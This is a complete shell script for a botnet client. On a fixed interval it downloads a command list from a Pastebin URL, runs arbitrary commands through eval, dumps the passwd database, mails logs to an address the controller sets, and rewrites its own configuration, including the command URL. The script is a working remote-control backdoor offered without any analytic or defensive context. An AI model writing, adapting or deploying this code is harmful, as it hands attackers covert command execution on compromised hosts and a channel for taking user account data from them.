#!/bin/sh

sendlog(){

  tmail=`echo $1 | sed 's/maillog//' | sed 's/\r//'`
  cat _log | mail $tmail 

}

run(){
  
  trun=`echo $1 | sed 's/run//' | sed 's/\r//'`
  eval "$trun" >> _log

}

changeconfig(){
  
  tset=`echo $1 | sed 's/set//' | sed 's/\r//'`
  eval "$tset"
  persistconfig
}

execbot(){

  while read tid tpid tcom; do
    #tid=`echo $line | sed -r 's/([0-9]+).*/\1/'`
    #tpid=`echo $line | sed -r 's/[0-9]+[[:space:]]+([*[:alnum:]]+).*/\1/'`
    #tcom=`echo $line | sed -r 's/[0-9]+[[:space:]]+[*[:alnum:]]+[[:space:]]+(.*)/\1/'`
  
    if [ "$tid" -le "$lastid" ]; then
      continue
    fi

    if [ "$tpid" != `hostname` ]; then
      if [ "$tpid" != "*" ]; then
        continue
      fi
    fi

    lastid=$tid
    persistconfig

    case $tcom in
      run*) run "$tcom";;
      passwd) getent passwd >> _log;;
      maillog*) sendlog "$tcom";;
      resetlog) rm _log 2> /dev/null;;
      set*) changeconfig "$tcom";;
      *) echo default;;
    esac

  done < _commands

}

persistconfig(){
  echo $lastid $period $url > _config
}

url="http://pastebin.com/raw.php?i=DAfLU6uw"
period=60
lastid=0

if [ -f _config ]; then
  read lastid period url < _config
else
  persistconfig
fi

while true; do
  wget $url -q -O _commands

  execbot _commands

  sleep $period
done

